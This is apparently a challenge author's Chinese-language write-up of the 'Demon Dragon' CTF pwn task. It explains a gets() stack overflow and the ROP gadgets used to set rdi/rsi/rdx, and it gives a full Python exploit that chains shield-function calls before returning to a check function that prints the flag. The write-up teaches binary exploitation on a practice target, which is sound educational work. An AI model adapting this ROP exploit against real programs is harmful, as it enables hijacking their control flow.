# Demon Dragon

题目本身不难，略微有些工作量。

首先是逆向程序，一开始会调用6个函数，这6个函数来自题目同时给出的`libmagic.so`，目的是为了让这6个函数被动态链接进来，可以直接忽略。随后，Demon Dragon会使用5种元素攻击你，元素的顺序是随机的。接下来需要输入使用的技能，这里存在简单的`gets`栈溢出。但是并不清楚溢出之后要干什么。

然后我们逆向`libmagic.so`，这个文件保留了符号表，因此可以看到刚才的6个函数，分别是5种元素护盾和一个`check`函数。观察后可以发现每种元素护盾都可以克制另一种元素（克制关系在题目描述里），当5种攻击都被克制后就可以通过`check`来拿到flag。可以看到`check`里存在`system("cat flag");`，如果这个函数不是动态链接的，选手可以直接栈溢出跳到这里。此外，5种护盾如果没有符号表则逆向难度较大，因此我把它们和`check`都编译成了动态链接库。

最后来看护盾如何调用：所有护盾都只需要函数参数等于特定值即可成功调用，区别仅仅是特定值与参数个数不同。那么如何控制参数呢？这是64位程序，我们需要控制前三个参数寄存器`rdi,rsi,rdx`。前两者在偏移过的`__lib_csu_init`中可以找到，比较通用：
```
pop rdi; ret
pop rsi; pop r15; ret
```
而`rdx`不太好控制，于是我在程序中直接硬编码了一个gadget：
```
pop rdi; pop rsi; pop rdx; ret
```

这样就可以构造rop链了，按元素克制关系调用5种护盾，最后返回到`check`函数getflag。不要忘了`check`函数也需要参数，这个参数可以参考第一次调用`check`时候的参数，位于`0x6020b0`。
```py
ru('with ')
elem = [ru(', ') for i in range(4)]
elem.append(ru('!\n'))

pop_rdi = 0x400e43 # 1
pop_rsi = 0x400e41 # 2
pop3 = 0x400c3a # 1,2,3

strategy = {
	'gold': flat(pop_rdi,0xdeadbabe,pop_rsi,0xdeadfa11,0,elf.plt['fire_shield']),
	'wood': flat(pop_rdi,0xdeadbeef,elf.plt['gold_shield']),
	'water': flat(pop_rdi,0xfee1dead,elf.plt['earth_shield']),
	'fire': flat(pop3,0xbaaaaaad,0x8badf00d,0xd15ea5e,elf.plt['water_shield']),
	'earth': flat(pop_rdi,0xcafebabe,pop_rsi,0xdeadbaad,0,elf.plt['wood_shield'])
}

payload = 'a'*0x48
for attack in elem:
	payload += strategy[attack]

pos = 0x6020b0
payload += flat(pop_rdi,pos,elf.plt['check'])
sla('Skill > ',payload)
```

注意链接时`libmagic.so`的目录，我放在和源程序同一目录下因此使用选项`-L.`。同时`/usr/lib/`下也需要有`libmagic.so`。

此外，感谢TaQini师傅提供的非预期解：直接ret2libc。